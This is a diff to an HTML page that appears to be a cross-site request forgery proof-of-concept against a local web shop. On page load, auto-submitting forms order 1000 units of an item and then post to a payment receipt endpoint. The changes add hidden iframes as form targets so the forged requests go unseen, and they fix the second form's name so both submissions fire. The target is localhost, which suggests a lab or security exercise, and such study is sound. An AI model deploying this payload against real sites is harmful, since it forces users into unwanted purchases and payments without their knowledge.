@@ -3,13 +3,15 @@
 	<h1>HELLO THERE</h1>
 </head>
 <body>
-		<form name="itemorder"  method="post" action=https://localhost>
+	<iframe style="display:none" name="csrf-item-frame"></iframe>
+	<iframe style="display:none" name="csrf-pay-frame"></iframe>
+		<form name="itemorder"  method="post" action=https://localhost target=csrf-item-frame>
 			<input type=hidden name=nbrOfItems value=1000>
 			<input type=hidden name=itemid value=2>';
 		</form>
 		<script>document.itemorder.submit()</script>
-		<form name="itemorder" method="post" action=https://localhost/receipt.php>
+		<form name="payment" method="post" action=https://localhost/receipt.php target=csrf-pay-frame>
 		</form>
-		<script>document.itemorder.submit()</script>
+		<script>document.payment.submit()</script>
 </body>
 </html>
